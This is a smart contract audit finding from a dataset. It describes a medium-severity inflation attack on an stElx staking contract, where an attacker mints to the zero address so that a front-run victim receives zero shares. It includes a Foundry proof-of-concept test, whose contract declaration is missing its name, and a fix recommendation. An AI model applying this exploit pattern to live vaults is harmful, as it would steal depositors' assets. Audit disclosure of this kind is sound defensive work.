# [M] Inflation attack via minting to zero address in stElx contract

## Summary
Severity: Medium
Contest weight: 0.6090
Dataset id: 15637
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
```solidity
function _transfer(address from, address to, uint256 amount) internal {
    uint256 shares = _balanceToShares(amount);
    if (from == address(0)) {
        preSyncSupply += SafeCast.toUint96(amount);
    } else if (to == address(0)) {
        preSyncSupply -= SafeCast.toUint96(amount);
    }
    _transferVotingUnits(from, to, shares);
    emit Transfer(from, to, amount);
}
```
An attacker can exploit this by minting a minimum share before significantly inflating the price of a share. If a user subsequently attempts to mint, the higher price per share may result in the mint transaction yielding zero shares, effectively transferring their assets to the attacker. The exploit enables the attacker to burn their artificially inflated shares and redeem a disproportionate amount of assets, causing loss to the legitimate minter.
Although the virtual offset mitigates the impact to some extent by requiring a large initial capital, the exploit remains viable.

## Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "./MainMigration.sol";
import "forge-std/console.sol";

is MainMigration {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    uint256 amount = 1e18;
    uint256 MINIMUM_MINT_AMOUNT = 1000;
    function setUp() public {
        dealElx(alice, amount);
        dealElx(bob, amount * MINIMUM_MINT_AMOUNT * 1e6 + 1);
        vm.prank(alice);
        elx.approve(address(minter), type(uint256).max);
        vm.prank(bob);
        elx.approve(address(minter), type(uint256).max);
    }
    function test() public {
        // Bob front-runs Alice's transaction
        vm.startPrank(bob);
        minter.mint(bob, MINIMUM_MINT_AMOUNT);
        minter.mint(address(0), amount * MINIMUM_MINT_AMOUNT * 1e6 - MINIMUM_MINT_AMOUNT + 1);
        vm.stopPrank();

        vm.prank(alice);
        minter.mint(alice, amount);
        require(stelx.sharesOf(alice) == 0);
    }
}
```

## Recommendation
The contract should explicitly revert transactions where Minter#mint is called with to == address(0).
